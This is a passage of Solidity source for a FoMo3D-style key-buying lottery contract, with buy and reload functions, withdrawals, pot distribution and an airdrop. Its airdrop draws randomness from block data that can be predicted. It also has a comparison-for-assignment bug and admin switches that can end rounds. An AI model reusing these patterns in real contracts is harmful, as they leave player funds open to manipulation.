round_[rID_].ended);\n }\n function setThreshold(uint256 _threshold) onlyAdmins() public returns(uint256) {\n rndReduceThreshold_ = _threshold;\n return rndReduceThreshold_;\n }\n function setEnforce(bool _closed) onlyAdmins() public returns(bool, uint256, bool) {\n closed_ = _closed;\n if( !closed_ && round_[rID_].ended == true && activated_ == true ){\n nextRound();\n }\n else if( closed_ && round_[rID_].ended == false && activated_ == true ){\n round_[rID_].end = now - 1;\n }\n return (closed_, rID_, now > round_[rID_].end);\n }\n function()\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);\n }\n function buyXid(uint256 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw()\n isActivated()\n isHuman()\n public\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n PCKdatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onWithdrawAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n } else {\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit PCKevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function getBuyPrice()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt + rndGap_)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].strt + rndGap_).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID)\n public\n view\n returns(uint256 ,uint256, uint256)\n {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n if (round_[_rID].plyr == _pID)\n {\n return\n (\n (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)\n private\n view\n returns(uint256)\n {\n return( ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo()\n public\n view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr)\n public\n view\n returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n if (_addr == address(0))\n {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return\n (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > (round_[_rID].strt + rndGap_) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n } else {\n if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ){\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onBuyAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > ( round_[_rID].strt + rndGap_ ) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n } else if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ) {\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onReLoadAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n if (plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)\n {\n uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000)\n {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000)\n {\n updateTimer(_keys, _rID, _eth);\n if (round_[_rID].plyr != _pID)\n round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000) {\n airDropTracker_++;\n if (airdrop() == true) {\n uint256 _prize;\n if (_eth >= 10000000000000000000)\n {\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)\n private\n view\n returns(uint256)\n {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth)\n public\n view\n returns(uint256)\n {\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys)\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0)\n {\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\")\n {\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return (_eventData_);\n }\n function verifyTeam(uint256 _team)\n private\n pure\n returns (uint256)\n {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return(_eventData_);\n }\n function nextRound() private {\n rID_++;\n round_[rID_].strt = now;\n round_[rID_].end = now.add(rndInit_).add(rndGap_);\n }\n function endRound(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot;\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0)\n {\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n if (!address(admin).call.value(_com)())\n {\n _p3d = _p3d.add(_com);\n _com = 0;\n }\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n if (_p3d > 0)\n PCGod.deposit.value(_p3d)();\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.PCPAmount = _p3d;\n _eventData_.newPot = _res;\n _rID++;\n round_[_rID].ended = false;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndInit_).add(rndGap_);\n round_[_rID].pot = _res;\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast)\n private\n {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0)\n {\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID, uint256 _eth)\n private\n {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n uint256 _newEndTime;\n if (_newTime < (rndMax_).add(_now))\n _newEndTime = _newTime;\n else\n _newEndTime = rndMax_.add(_now);\n if ( _eth >= rndReduceThreshold_ ) {\n _newEndTime = (_newEndTime).sub( (((_keys) / (1000000000000000000))).mul(rndInc_).add( (((_keys) / (2000000000000000000) ).mul(rndInc_)) ) );\n if( _newEndTime < _now + rndMin_ )\n _newEndTime = _now + rndMin_ ;\n }\n round_[_rID].end = _newEndTime;\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _com = _eth / 50;\n uint256 _p3d;\n if (!address(admin).call.value(_com)())\n {\n _p3d = _com;\n _com = 0;\n }\n uint256 _long = _eth / 100;\n potSwap(_long);\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit PCKevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);\n } else {\n _p3d = _aff;\n }\n _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));\n if (_p3d > 0)\n {\n PCGod.deposit.value(_p3d)();\n _eventData_.PCPAmount = _p3d.add(_eventData_.PCPAmount);\n }\n return(_eventData_);\n }\n function potSwap(uint256 _pot) private {\n uint256 _rID = rID_ + 1;\n round_[_rID].pot = round_[_rID].pot.add(_pot);\n emit PCKevents.onPotSwapDeposit(_rID, _pot);\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)\n private\n returns(uint256)\n {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID)\n private\n returns(uint256)\n {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0)\n {\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit PCKevents.onEndTx\n (\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n bool public activated_ = false;\n function activate() public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(activated_ == false, \"PCK already activated\");\n activated_ = true;\n rID_ = 1;\n round_[1].strt = now + rndExtra_ - rndGap_;\n round_[1].end = now + rndInit_ + rndExtra_;\n }\n}\nlibrary PCKdatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 PCPAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n }\n struct TeamFee {\n uint256 gen;\n uint256 p3d;\n }\n struct PotSplit {\n uint256 gen;\n uint256 p3d;\n }\n}\nlibrary PCKKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ninterface PCKExtSettingInterface {\n function getFastGap() external view returns(uint256);\n function getLongGap() external view returns(uint256);\n function getFastExtra() external view returns(uint256);\n function getLongExtra() external view returns(uint256);\n}\ninterface PlayCoinGodInterface {\n function deposit() external payable;\n}\ninterface ProForwarderInterface {\n function deposit() external payable returns(bool);\n function status() external view returns(address, address, bool);\n function startMigration(address _newCorpBank) external returns(bool);\n function cancelMigration() external returns(bool);\n function finishMigration() external returns(bool);\n function setup(address _firstCorpBank) external;\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub 